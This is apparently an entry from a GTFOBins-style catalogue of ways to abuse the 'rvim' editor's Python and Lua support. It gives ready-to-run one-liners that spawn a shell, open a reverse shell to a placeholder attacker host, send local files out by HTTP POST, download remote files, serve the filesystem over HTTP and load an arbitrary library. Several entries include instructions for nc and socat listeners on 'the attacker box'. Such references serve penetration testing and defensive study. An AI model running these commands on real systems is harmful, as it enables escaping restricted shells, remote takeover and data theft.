shell.description: This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3.
shell.code: rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

shell.description: This requires that 'rvim' is compiled with Lua support.

reverse-shell.description: This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Run 'socat file:`tty`,raw,echo=0 tcp-listen:[port]' on the attacker box to receive the shell.
reverse-shell.code:
rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect(("[host]",[port])))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'

non-interactive-reverse-shell.description: Run 'nc -l -p [port]' on the attacker box to receive the shell. This requires that 'rvim' is compiled with Lua support and that 'lua-socket' is installed.

non-interactive-bind-shell.description: Run 'nc [host] [port]' on the attacker box to connect to the shell. This requires that 'rvim' is compiled with Lua support and that `lua-socket` is installed.

file-upload.description: This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Send local file via 'd' parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
file-upload.code:
rvim -c ':py import vim,sys;
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("[url]", bytes(u.urlencode({"d":open("[file]").read()}).encode()))
vim.command(":q!")'

file-upload.description: This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Serve files in the local folder running an HTTP server.
file-upload.code:
rvim -c ':py import vim,sys;
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", [port]), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'

file-upload.description: Send a local file via TCP. Run 'nc -l -p [port] > [file]' on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that 'lua-socket' is installed.

file-download.description: This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Fetch a remote file via HTTP GET request.
file-download.code:
rvim -c ':py import vim,sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("[url]", "[file]")
vim.command(":q!")'

file-download.description: Fetch a remote file via TCP. Run 'nc [host] [port] < [file]' on the attacker box to send the file. This requires that 'rvim' is compiled with Lua support and that 'lua-socket' is installed.

library-load.description: This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3.
library-load.code: rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
